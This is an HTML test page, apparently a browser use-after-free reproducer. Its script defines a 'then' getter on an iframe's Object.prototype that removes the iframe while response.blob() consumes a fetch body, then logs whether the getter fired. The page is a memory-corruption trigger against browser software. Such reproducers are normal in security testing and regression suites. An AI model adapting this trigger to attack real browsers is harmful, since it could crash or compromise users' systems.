<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>FetchBodyConsumer UAF test</title>
</head>
<body>
<pre id="log">Starting test...</pre>
<script>
var output=[];
var getterTriggered=false;
var frameRemoved=false;

function log(s){
    output.push(s);
    document.getElementById("log").textContent=output.join("\n");
}

function createReadStream(){
    const response=new Response(new Blob(["aaaaa"]));
    return response.body;
}

try{
    const f=document.body.appendChild(document.createElement("iframe"));
    const response=new f.contentWindow.Response(createReadStream());

    f.contentWindow.Object.prototype.__defineGetter__("then",function(){
        getterTriggered=true;
        delete f.contentWindow.Object.prototype.then;
        f.remove();
        frameRemoved=true;
        log("Getter then triggered");
        log("Iframe removed");
    });

    log("Calling response.blob()");
    response.blob();

    setTimeout(function(){
        log("Test sequence completed");
        log("Getter triggered: "+getterTriggered);
        log("Iframe removed: "+frameRemoved);
    },100);

}catch(e){
    log("ERROR: "+e.name+": "+e.message);
}
</script>
</body>
</html>
